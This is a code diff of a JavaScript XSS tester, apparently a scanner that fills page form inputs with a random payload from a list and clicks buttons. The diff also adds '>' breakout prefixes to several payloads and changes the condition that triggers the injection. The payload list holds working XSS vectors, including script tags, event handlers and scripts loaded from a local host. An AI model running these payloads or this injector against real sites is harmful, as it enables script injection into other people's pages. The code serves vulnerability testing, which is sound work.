@@ -10,7 +10,6 @@ var XSSattack = function(message){
 	if (forms.length !== 0){
 		for (var i = 0; i < forms.length; i++){
 			inputs.push(forms[i].getElementsByTagName('input'));
-
 		}
 		for (var j = 0; j < inputs.length; j++){
 			for (var k = 0; k < inputs[j].length; k++){
@@ -28,30 +27,27 @@ var XSSattack = function(message){
 			}
 		}
 	}
-		$('button').trigger('click');
+	$('button').trigger('click');
 };
 
 var attackVariants = [
-  '<script>alert("You are vulnerable to a Standard XSS attack")</script>',
+  '><script>alert("You are vulnerable to a Standard XSS attack")</script>',
   '<a onmouseover="alert(\'You are vulnerable to Broken Tag XSS attacks\')">Injected Element</a>',
-  '<<SCRIPT>alert("You are vulnerable to an Extraneous Open Bracket XSS attack");//<</SCRIPT>',
-  '</TITLE><SCRIPT>alert("You are vulnerable to a Title Change XSS attack");</SCRIPT>',
+  '><<SCRIPT>alert("You are vulnerable to an Extraneous Open Bracket XSS attack");//<</SCRIPT>',
+  '></TITLE><SCRIPT>alert("You are vulnerable to a Title Change XSS attack");</SCRIPT>',
   '<IFRAME src="http://0.0.0.0:8000/non-alpha-xss.js"></IFRAME>',
-  '<SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.js></SCRIPT>',
-  '<SCRIPT/SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
+  '><SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.js></SCRIPT>',
+  '><SCRIPT/SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
   '<IMG src="" onerror="alert(\'You are vulnerable to On-Error XSS attacks\')">',
-  '<SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.jpg></SCRIPT>',
+  '><SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.jpg></SCRIPT>',
   'data:text/html,<script>alert("You are vulnerable to a Data Injection XSS attack")</script>',
   '<a href=“?xss=<script>”>You are vulnerable to Click-Jacking XSS attacks</a>',
-  '<SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
+  '><SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
   "'><SCRIPT>alert('You are vulnerable to XSS')</SCRIPT><xss a='",
   '<input onfocus="alert()" autofocus>',
   '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
-  'http://0.0.0.0:8000/non-alpha-xss.js',
-
-
+  'http://0.0.0.0:8000/non-alpha-xss.js'
 ];
-// XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
 
 $.ajax({
 	type: "GET",
@@ -60,7 +56,7 @@ $.ajax({
 		console.log('GET IS WORKING')
 		console.log(data + '')
 		console.log(document.URL)
-		if ((!data) || data !== document.URL){
+		if ((!data) || data === document.URL){
 			XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
 			$.ajax({
 				type: "POST",
@@ -75,9 +71,6 @@ $.ajax({
 		}
 	}
 });
-
-
-// XSSattack(attackVariants[attackVariants.length-1]);
 
 
 
